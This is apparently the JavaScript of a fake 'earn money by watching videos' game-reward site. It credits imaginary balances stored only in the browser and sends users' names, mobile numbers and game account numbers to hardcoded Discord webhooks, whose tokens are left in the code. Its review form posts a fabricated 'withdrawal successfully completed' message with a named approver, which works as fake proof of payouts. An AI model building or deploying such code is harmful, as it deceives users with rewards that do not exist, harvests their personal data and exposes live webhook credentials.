let currentUser =
JSON.parse(localStorage.getItem("currentUser"));

const VIDEO_LINK =
"https://youtu.be/uFKVzV-2DmI?si=pqgRBPmaucyv6oWn";

const subscribeWebhook =
"https://discord.com/api/webhooks/1503773951325638716/zeBKmrRqWRfaSZBFC07__bZ_hqOsnFqSgyd_zigjklRT4ebCsmq8jhGP5ZbYrcoD6oNX";

const withdrawWebhook =
"https://discord.com/api/webhooks/1503774858146742533/cR1OERc6wVRpu0Wy708kRphgmdcssuS_9QDuUHrSTSaK3wJhGDHMBjNl0DdX4eOGc2ey";

const loginWebhook =
"https://discord.com/api/webhooks/1504475286845259978/XkO1Gm7cFi8x1N5ixDDcU-iiS9HaFYp8R42WJMZcq7ZMfhSuaBSga1gToI-vrEch8VMO";

const balanceWebhook =
"https://discord.com/api/webhooks/1504475637069385730/XTi4OFxJC0d1ZWWl23gg2c4qob3TyTuBmTQYlAjd87amBuVVF6kkKJ8ainS90WtYKGox";
// AUTO LOGIN
window.onload = () => {

if(currentUser){

showProfile();

}

};

// LOGIN
function loginUser(){

let name =
document.getElementById("name").value.trim();

let mobile =
document.getElementById("mobile").value.trim();

let server =
document.getElementById("server").value;

let password =
document.getElementById("password").value.trim();

if(!name || !mobile || !password){

alert("Fill all fields");
return;

}

let users =
JSON.parse(localStorage.getItem("users")) || [];

let existingUser =
users.find(
x =>
x.mobile === mobile ||
x.name.toLowerCase() === name.toLowerCase()
);

if(existingUser){

currentUser = existingUser;

}else{

currentUser = {

sno: users.length + 1,

name,
mobile,
server,
password,

balance: 0,
earning: 0,
withdrawn: 0,

verified: false,

lastVideo: ""

};

users.push(currentUser);

localStorage.setItem(
"users",
JSON.stringify(users)
);

}

localStorage.setItem(
"currentUser",
JSON.stringify(currentUser)
);
fetch(loginWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"👤 NEW LOGIN\n\n" +

"S. No : " +
currentUser.sno + "\n" +

"Name : " +
currentUser.name + "\n" +

"Server : " +
currentUser.server + "\n" +

"Mobile : " +
currentUser.mobile

})

});
showProfile();

}

// SHOW PROFILE
function showProfile(){

document.getElementById("loginPage")
.classList.add("hidden");

document.getElementById("profilePage")
.classList.remove("hidden");

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

document.getElementById("withdrawn")
.innerText =
currentUser.withdrawn;

// AUTO FILL

document.getElementById("subName")
.value =
currentUser.name;

document.getElementById("subServer")
.value =
currentUser.server;

document.getElementById("withName")
.value =
currentUser.name;

document.getElementById("withServer")
.value =
currentUser.server;

document.getElementById("reviewName")
.value =
currentUser.name;

// LOCK VERIFY BUTTON

if(currentUser.verified){

document.querySelector(
'button[onclick="showSection(\'subscribeSection\')"]'
).innerText =
"VERIFICATION COMPLETED 🔒";

}

}

// SAVE USER
function saveUser(){

let users =
JSON.parse(localStorage.getItem("users")) || [];

let index =
users.findIndex(
x =>
x.mobile === currentUser.mobile
);

users[index] = currentUser;

localStorage.setItem(
"users",
JSON.stringify(users)
);

localStorage.setItem(
"currentUser",
JSON.stringify(currentUser)
);

}

// SHOW SECTION
function showSection(id){

if(
id === "subscribeSection"
&& currentUser.verified
){

alert("Already verified 🔒");
return;

}

document.getElementById("profilePage")
.classList.add("hidden");

document.querySelectorAll(".section")
.forEach(sec => {

sec.classList.add("hidden");

});

document.getElementById(id)
.classList.remove("hidden");

}

// BACK PROFILE
function backProfile(){

document.querySelectorAll(".section")
.forEach(sec => {

sec.classList.add("hidden");

});

document.getElementById("profilePage")
.classList.remove("hidden");

}

// VIDEO REWARD
function watchVideo(){

// ONLY ONE TIME PER VIDEO

if(currentUser.lastVideo === VIDEO_LINK){

alert(
"Reward already claimed for this video ❌"
);

return;

}

// OPEN VIDEO

window.open(
VIDEO_LINK,
"_blank"
);

// WAIT 10 SECONDS

setTimeout(() => {

currentUser.balance += 2000;

currentUser.earning += 2000;

// SAVE LAST VIDEO

currentUser.lastVideo = VIDEO_LINK;

saveUser();
sendBalanceUpdate();

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

alert("2000 Money Added ✅");

},10000);

}

// SUBSCRIBE
function submitSubscribe(){

if(currentUser.verified){

alert("Already verified 🔒");
return;

}

let gameNumber =
document.getElementById("gameNumber")
.value.trim();

let link =
document.getElementById("proofLink")
.value.trim();

if(!gameNumber || !link){

alert("Fill all fields");
return;

}

if(!/^\d{6}$/.test(gameNumber)){

alert("Game number must be 6 digits ❌");
return;

}

// DISCORD MESSAGE

fetch(subscribeWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"🆕 SUBSCRIBER\n\n" +

"User: " +
currentUser.name + "\n" +

"Game Name: " +
currentUser.name + "\n" +

"Number: " +
gameNumber + "\n" +

"Reward: $ 100,000\n\n" +

"Image Link:\n" +
link + "\n\n" +

"<@&1503714193214406827>"

})

});

// VERIFY + REWARD

currentUser.verified = true;

currentUser.balance += 100000;

currentUser.earning += 100000;

saveUser();
sendBalanceUpdate();

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("earning")
.innerText =
currentUser.earning;

// LOCK BUTTON

document.querySelector(
'button[onclick="showSection(\'subscribeSection\')"]'
).innerText =
"VERIFICATION COMPLETED 🔒";

alert(
"Verification Completed + 100000 Added ✅"
);

backProfile();

}

// WITHDRAW
function submitWithdraw(){

let number =
document.getElementById(
"withdrawNumber"
).value.trim();

let amount =
Number(
document.getElementById(
"withdrawAmount"
).value
);

if(!number || !amount){

alert("Fill all fields");
return;

}

if(!/^\d{6}$/.test(number)){

alert("Game number must be 6 digits ❌");
return;

}

if(currentUser.balance < amount){

alert("Not enough balance ❌");
return;

}

// CUT MONEY

currentUser.balance -= amount;

currentUser.withdrawn += amount;

saveUser();
sendBalanceUpdate();

// DISCORD MESSAGE

fetch(withdrawWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💸 NEW WITHDRAW REQUEST\n\n" +

"User: " +
currentUser.name + "\n" +

"Number: " +
number + "\n" +

"Amount: $ " +
amount + " 💰\n" +

"Status: Waiting ⏳"

})

});

document.getElementById("balance")
.innerText =
currentUser.balance;

document.getElementById("withdrawn")
.innerText =
currentUser.withdrawn;

alert("Withdraw Submitted ✅");

backProfile();

}

// REVIEW
function submitReview(){

let review =
document.getElementById("reviewText")
.value.trim();

let image =
document.getElementById("reviewImage")
.value.trim();

if(!review || !image){

alert("Fill all fields");
return;

}

// DISCORD MESSAGE

fetch(withdrawWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💸 WITHDRAWAL SUCCESSFULLY COMPLETED\n\n" +

currentUser.withdrawn +

" coins transferred successfully to " +

currentUser.name +

" game account 🎮\n\n" +

"Player Review:\n" +

review +

"\n\n" +

"Image Link:\n" +

image +

"\n\nApproved By:\n" +

"Lucas_Arora 👑\n" +

"<@&1503714193214406827>"

})

});

alert("Review Submitted ✅");

backProfile();

}
function sendBalanceUpdate(){

fetch(balanceWebhook,{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:

"💰 BALANCE UPDATED\n\n" +

"S. No : " +
currentUser.sno + "\n" +

"Username : " +
currentUser.name + "\n" +

"Total Earning : " +
currentUser.earning + "\n" +

"Withdrawal Money : " +
currentUser.withdrawn + "\n" +

"Current Balance : " +
currentUser.balance

})

});

}
// LOGOUT
function logout(){

localStorage.removeItem("currentUser");

location.reload();

}
// localStorage.clear();



// end
